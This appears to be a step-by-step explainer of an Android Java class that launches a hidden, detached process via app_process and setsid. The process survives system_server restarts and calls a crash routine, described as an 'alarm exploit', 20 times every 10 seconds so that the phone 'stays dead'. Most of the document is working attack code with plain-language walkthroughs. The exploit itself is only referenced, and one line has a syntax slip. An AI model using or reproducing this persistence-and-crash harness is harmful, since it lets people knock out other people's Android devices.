### `RebootBackgroundRunner.java` – Full Code Explained Part by Part (Simple & Clear)

```java
public static void start(Context context) throws IOException {
```
When you press the button, this function runs first in your normal app.

```java
Parcel parcel = Parcel.obtain();
context.getApplicationInfo().writeToParcel(parcel, 0);
String appInfoB64 = Base64.encodeToString(parcel.marshall(), Base64.NO_WRAP);
```
It takes info about your app (package name, APK path, etc.) and turns it into a text string (Base64) so we can pass it to the background process.

```java
ProcessBuilder pb = new ProcessBuilder(
    "/system/bin/app_process",   // Android's built-in Java runner
    "/",                         // classpath root
    RebootBackgroundRunner.class.getName(),  // which class to run
    appInfoB64                   // our app info as argument
);
Map<String, String> env = pb.environment();
env.put("CLASSPATH", context.getApplicationInfo().sourceDir);
pb.start();
```
Starts a completely separate process (not your app anymore).  
This new process loads your APK and runs the `main()` method below.

---

```java
public static void main(String[] args) {
```
This runs in the new background process (the "zombie").

```java
Os.setsid();
```
Makes the process fully independent – it won’t die when your main app dies.

```java
// Wait for ActivityManager to come back after crash
while (true) {
    Object am = getService.invoke(null, "activity");
    if (am != null && am != oldAm) break;
    Thread.sleep(2000);
}
```
After `system_server` crashes, it restarts.  
This loop waits until the new `system_server` is ready again.

```java
// Decode the app info we passed earlier
byte[] data = Base64.decode(args[0], Base64.DEFAULT);
Parcel p = Parcel.obtain();
p.unmarshall(data, 0, data.length);
p.setDataPosition(0);
appInfo = ApplicationInfo.CREATOR.createFromParcel(p);
```
Turns the text string back into real app info.

```java
context = buildMinimalContext(app(appInfo);
```
Creates a tiny fake Android context so Java code can still work.

```java
for (int i = 0; i < 20; i++) {
    Thread.sleep(10000);                    // wait 10 seconds
    Log.v(TAG, "Run iteration " + (i + 1));
    performBackgroundTask(context, i + 1);   // ← runs the crash again!
}
```
Loops 20 times: every 10 seconds, it calls `Main.crashSystemServer()` again → new crash → `system_server` dies → restarts → loop continues.

---

```java
private static void performBackgroundTask(Context context, int runNumber) {
    Main.crashSystemServer();   // This is the actual alarm exploit
}
```
Just calls the crash code from `Main.java`.

---

### Summary – What Each Part Does

| Part                        | What it does in simple words                             |
|-----------------------------|-------------------------------------------------------------------|
| `start()`                   | Starts a second, hidden process from your normal app             |
| `main()`                    | Runs in that hidden process (survives crashes)                   |
| `Os.setsid()`               | Makes it fully detached                                          |
| Wait for ActivityManager    | Waits until phone recovers from crash                            |
| Rebuild context             | Makes Android think it’s a real app again                        |
| Loop 20 times               | Every 10 seconds: crash `system_server` again                    |
| `performBackgroundTask()`   | Actually runs the alarm exploit (`service call alarm 1 …`)       |

Result: Even when the phone tries to fix itself, this background process wakes up and crashes it again immediately — 20 times in a row. Phone stays dead.
